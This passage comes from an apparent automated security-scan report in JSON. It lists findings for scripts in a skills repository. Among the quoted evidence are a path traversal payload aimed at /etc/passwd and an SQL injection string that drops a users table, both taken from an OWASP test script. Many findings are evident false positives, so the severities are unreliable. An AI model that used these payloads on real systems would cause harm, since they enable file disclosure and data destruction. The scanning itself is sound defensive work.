      "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
      "line_number": 80,
      "issue": "Path traversal pattern",
      "evidence": "\"....//....//....//etc/passwd\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
      "line_number": 131,
      "issue": "Unencrypted HTTP",
      "evidence": "http_url = self.target.replace('https://', 'http://')",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
      "line_number": 146,
      "issue": "Unencrypted HTTP",
      "evidence": "hostname = self.target.replace('https://', '').replace('http://', '').split('/')[0]",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
      "line_number": 199,
      "issue": "Destructive database operation",
      "evidence": "\"'; DROP TABLE users; --\",  # Example of destructive injection payload",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/security/security-headers/resources/scripts/check_headers.py",
      "line_number": 66,
      "issue": "Unencrypted HTTP",
      "evidence": "if not url.startswith(('http://', 'https://')):",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
      "line_number": 190,
      "issue": "Unencrypted HTTP",
      "evidence": "if stripped.startswith('ADD') and ('http://' in line or 'https://' in line):",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
      "line_number": 202,
      "issue": "Unencrypted HTTP",
      "evidence": "if 'http://' in line.lower() and 'sha' not in line.lower():",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
      "line_number": 220,
      "issue": "Destructive file deletion",
      "evidence": "if 'apt-get install' in line and 'rm -rf /var/lib/apt/lists/*' not in line:",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
      "line_number": 222,
      "issue": "Destructive file deletion",
      "evidence": "if not self._is_multiline_command_with_cleanup(i, 'rm -rf /var/lib/apt/lists/*'):",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
      "line_number": 229,
      "issue": "Destructive file deletion",
      "evidence": "recommendation='Add: && rm -rf /var/lib/apt/lists/* in same RUN'",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
      "line_number": 260,
      "issue": "Force flag usage",
      "evidence": "recommendation='Add: && npm cache clean --force'",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
      "line_number": 318,
      "issue": "Unencrypted HTTP",
      "evidence": "if not ('http://' in line or 'https://' in line or '.tar' in line):",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/observability/distributed-tracing/resources/scripts/visualize_trace.py",
      "line_number": 537,
      "issue": "Unencrypted HTTP",
      "evidence": "svg_parts.append(f'<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"{width}\" height=\"{height}\">')",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "SQL Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/analyze_metrics.py",
      "line_number": 93,
      "issue": "Possible SQL injection via string concatenation",
      "evidence": "result = self.query('{__name__=~\".+\"}')",
      "recommendation": "Use parameterized queries"
    },
    {
      "severity": "HIGH",
      "category": "SQL Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/analyze_metrics.py",
      "line_number": 108,
      "issue": "Possible SQL injection via string concatenation",
      "evidence": "result = self.query('count by (__name__) ({__name__=~\".+\"})')",
      "recommendation": "Use parameterized queries"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/incident-response/resources/examples/integrations/slack-incident-bot.py",
      "line_number": 151,
      "issue": "Backtick command execution",
      "evidence": "\"text\": \":information_source: Use this channel for incident coordination only. Post updates in format: `[HH:MM] [@person] [ACTION/DECISION/OBSERVATION] Description`\"",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/resources/sre-practices/examples/chaos-scenario.py",
      "line_number": 359,
      "issue": "Unencrypted HTTP",
      "evidence": "service_url=\"http://api.example.com\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/resources/sre-practices/examples/chaos-scenario.py",
      "line_number": 360,
      "issue": "Unencrypted HTTP",
      "evidence": "dependency_url=\"http://auth.example.com\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/scripts/validate_alert_rules.py",
      "line_number": 287,
      "issue": "Unencrypted HTTP",
      "evidence": "if url and not url.startswith(('http://', 'https://')):",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "CRITICAL",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
      "line_number": 287,
      "issue": "eval() usage",
      "evidence": "message=\"Use of 'eval()' is a security risk. \"",
      "recommendation": "Never use eval() with user input"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
      "line_number": 297,
      "issue": "exec() usage",
      "evidence": "message=\"Use of 'exec()' is a security risk. \"",
      "recommendation": "Avoid exec() or strictly validate input"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
      "line_number": 312,
      "issue": "shell=True in subprocess",
      "evidence": "# Check for shell=True in subprocess",
      "recommendation": "Use shell=False and pass command as list"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
      "line_number": 319,
      "issue": "shell=True in subprocess",
      "evidence": "message=\"subprocess with shell=True is vulnerable to injection. \"",
      "recommendation": "Use shell=False and pass command as list"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/review_pr.py",
      "line_number": 292,
      "issue": "shell=True in subprocess",
      "evidence": "shell=True,",
      "recommendation": "Use shell=False and pass command as list"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/typed-holes-refactor/scripts/check_production.py",
      "line_number": 26,
      "issue": "Path traversal pattern",
      "evidence": "print(\"\ud83d\ude80 Checking Production Readiness (Gate 4)...\\n\")",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/typed-holes-refactor/scripts/check_foundation.py",
      "line_number": 26,
      "issue": "Path traversal pattern",
      "evidence": "print(\"\ud83c\udfd7\ufe0f  Checking Foundation Phase (Gate 2)...\\n\")",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/typed-holes-refactor/scripts/holes_to_beads.py",
      "line_number": 94,
      "issue": "Path traversal pattern",
      "evidence": "print(\"\ud83d\udd04 Syncing holes to beads...\\n\")",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/typed-holes-refactor/scripts/discover_holes.py",
      "line_number": 249,
      "issue": "Backtick command execution",
      "evidence": "3. Write characterization tests (see `tests/characterization/`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/typed-holes-refactor/scripts/discover_holes.py",
      "line_number": 251,
      "issue": "Backtick command execution",
      "evidence": "5. Run `python scripts/next_hole.py` to see next resolvable holes",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/typed-holes-refactor/scripts/discover_holes.py",
      "line_number": 311,
      "issue": "Backtick command execution",
      "evidence": "print(\"\ud83c\udfaf Then: Run `python scripts/next_hole.py` to start resolution\")",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/typed-holes-refactor/scripts/check_discovery.py",
      "line_number": 25,
      "issue": "Path traversal pattern",
      "evidence": "print(\"\ud83d\udd0d Checking Discovery Phase (Gate 1)...\\n\")",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/typed-holes-refactor/scripts/generate_report.py",
      "line_number": 147,
      "issue": "Backtick command execution",
      "evidence": "Run `radon cc -a src/` and `pytest --cov` for detailed metrics.",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/typed-holes-refactor/scripts/generate_report.py",
      "line_number": 199,
      "issue": "Backtick command execution",
      "evidence": "Run `pytest --cov=src --cov-report=html` for detailed coverage report.",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/typed-holes-refactor/scripts/check_implementation.py",
      "line_number": 26,
      "issue": "Path traversal pattern",
      "evidence": "print(\"\u2699\ufe0f  Checking Implementation Phase (Gate 3)...\\n\")",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/frontend/nextjs-seo/resources/scripts/check_seo.py",
      "line_number": 163,
      "issue": "Unencrypted HTTP",
      "evidence": "if not canonical_url.startswith(('http://', 'https://')):",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/frontend/nextjs-seo/resources/scripts/generate_sitemap.py",
      "line_number": 203,
      "issue": "Unencrypted HTTP",
      "evidence": "urlset.set('xmlns', 'http://www.sitemaps.org/schemas/sitemap/0.9')",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/benchmark_operations.py",
      "line_number": 464,
      "issue": "Path traversal pattern",
      "evidence": "print(f\"Running benchmarks with {args.iterations} iterations...\\n\", file=sys.stderr)",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/scripts/generate_migration.py",
      "line_number": 89,
      "issue": "Destructive database operation",
      "evidence": "drop_sql = f\"DROP TABLE IF EXISTS {table_name};\"",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/scripts/analyze_migration.py",
      "line_number": 121,
      "issue": "Destructive database operation",
      "evidence": "(r'\\bDROP\\s+TABLE\\s+(?!IF\\s+EXISTS)', 'DROP TABLE without IF EXISTS'),",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "SQL Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/analyze_query.py",
      "line_number": 356,
      "issue": "Possible SQL injection via f-string",
      "evidence": "cur.execute(f\"EXPLAIN (ANALYZE, BUFFERS) {args.query}\")",
      "recommendation": "Use parameterized queries"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/python/user_projection.py",
      "line_number": 201,
      "issue": "Destructive database operation",
      "evidence": "cursor.execute(f\"TRUNCATE TABLE {self.projection_name}\")",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "HIGH",
      "category": "SQL Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/python/user_projection.py",
      "line_number": 201,
      "issue": "Possible SQL injection via f-string",
      "evidence": "cursor.execute(f\"TRUNCATE TABLE {self.projection_name}\")",
      "recommendation": "Use parameterized queries"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/python/bank_account_aggregate.py",
      "line_number": 99,
      "issue": "User-controlled file path",
      "evidence": "def open(cls, account_id: str, owner: str, initial_deposit: Decimal, user_id: str) -> 'BankAccount':",
      "recommendation": "Validate path is within allowed directory"
    },
    {
      "severity": "HIGH",
      "category": "SQL Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/scripts/replay_events.py",
      "line_number": 331,
      "issue": "Possible SQL injection via f-string",
      "evidence": "# cursor.execute(f\"TRUNCATE TABLE {self.projection_name}\")",
      "recommendation": "Use parameterized queries"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/examples/python/config-generator.py",
      "line_number": 98,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/examples/python/config-generator.py",
      "line_number": 192,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/examples/python/config-generator.py",
      "line_number": 339,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend_pool;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/scripts/validate_config.py",
      "line_number": 343,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_passes = re.findall(r'proxy_pass\\s+http://(\\d+\\.\\d+\\.\\d+\\.\\d+)', content)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 147,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 150,
      "issue": "Command substitution in shell",
      "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 153,
      "issue": "Command substitution in shell",
      "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 192,
      "issue": "Command substitution in shell",
      "evidence": "response=$(eval curl $curl_opts \"$url\" 2>&1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 197,
      "issue": "Command substitution in shell",
      "evidence": "body=$(echo \"$response\" | head -n -1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 198,
      "issue": "Command substitution in shell",
      "evidence": "status_code=$(echo \"$response\" | tail -n 1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 227,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request GET /health \"\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 239,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request GET /api/users \"\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 261,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request GET /api/users/1 \"\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 285,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request POST /api/users \"$data\" \"\" 201 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 291,
      "issue": "Command substitution in shell",
      "evidence": "CREATED_RESOURCE_ID=$(echo \"$response\" | jq -r '.id')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 314,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request PUT /api/users/$resource_id \"$data\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 329,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request PATCH /api/users/$resource_id \"$data\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 344,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request DELETE /api/users/$resource_id \"\" \"\" 204 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 346,
      "issue": "Command substitution in shell",
      "evidence": "elif response=$(make_request DELETE /api/users/$resource_id \"\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 359,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request GET /api/users/999999 \"\" \"\" 404 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 379,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request POST /api/users \"$data\" \"\" 400 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 381,
      "issue": "Command substitution in shell",
      "evidence": "elif response=$(make_request POST /api/users \"$data\" \"\" 422 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 394,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request GET \"/api/users?limit=10&offset=0\" \"\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 412,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request GET \"/api/users?status=active\" \"\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 424,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request GET \"/api/users?sort=created_at\" \"\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 436,
      "issue": "Command substitution in shell",
      "evidence": "if response=$(make_request GET /api/users \"\" \"-H 'Accept: application/json'\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 455,
      "issue": "Command substitution in shell",
      "evidence": "if ! response=$(make_request GET /api/users \"\" \"\" 200 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 461,
      "issue": "Command substitution in shell",
      "evidence": "count=$((count + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 478,
      "issue": "Command substitution in shell",
      "evidence": "response1=$(curl -s -I \"${BASE_URL}/api/users\" 2>&1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 495,
      "issue": "Command substitution in shell",
      "evidence": "if ! response=$(make_request GET /api/users \"\" \"\" 401 2>&1); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
      "line_number": 509,
      "issue": "Command substitution in shell",
      "evidence": "response=$(curl -s -I -X OPTIONS \"${BASE_URL}/api/users\" 2>&1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 150,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 154,
      "issue": "Command substitution in shell",
      "evidence": "invoke_output=$(eval \"$aws_cmd\" 2>&1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 157,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 158,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 166,
      "issue": "Command substitution in shell",
      "evidence": "local status_code=$(echo \"$invoke_output\" | jq -r '.StatusCode // empty')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 167,
      "issue": "Command substitution in shell",
      "evidence": "local function_error=$(echo \"$invoke_output\" | jq -r '.FunctionError // empty')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 168,
      "issue": "Command substitution in shell",
      "evidence": "local log_result=$(echo \"$invoke_output\" | jq -r '.LogResult // empty')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 173,
      "issue": "Command substitution in shell",
      "evidence": "logs=$(echo \"$log_result\" | base64 --decode)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 179,
      "issue": "Command substitution in shell",
      "evidence": "response=$(cat \"$response_file\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 236,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(($(date +%s) + duration))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 243,
      "issue": "Command substitution in shell",
      "evidence": "local tmp_dir=$(mktemp -d)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 244,
      "issue": "Destructive file deletion",
      "evidence": "trap \"rm -rf $tmp_dir\" EXIT  # Test cleanup - safe in test context",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 247,
      "issue": "Command substitution in shell",
      "evidence": "while [[ $(date +%s) -lt $end_time ]]; do",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 251,
      "issue": "Command substitution in shell",
      "evidence": "local start=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 273,
      "issue": "Command substitution in shell",
      "evidence": "local status_code=$(jq -r '.StatusCode // 200' \"$response_file\" 2>/dev/null || echo \"200\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 283,
      "issue": "Command substitution in shell",
      "evidence": "local end=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 284,
      "issue": "Command substitution in shell",
      "evidence": "echo \"duration:$(echo \"$end - $start\" | bc)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 294,
      "issue": "Command substitution in shell",
      "evidence": "local batch_success=$(jobs -p | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 295,
      "issue": "Command substitution in shell",
      "evidence": "total_requests=$((total_requests + concurrency))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 305,
      "issue": "Command substitution in shell",
      "evidence": "successful_requests=$(grep -c \"success\" \"$tmp_dir\"/* 2>/dev/null || echo \"0\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
      "line_number": 306,
      "issue": "Command substitution in shell",
      "evidence": "failed_requests=$((total_requests - successful_requests))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
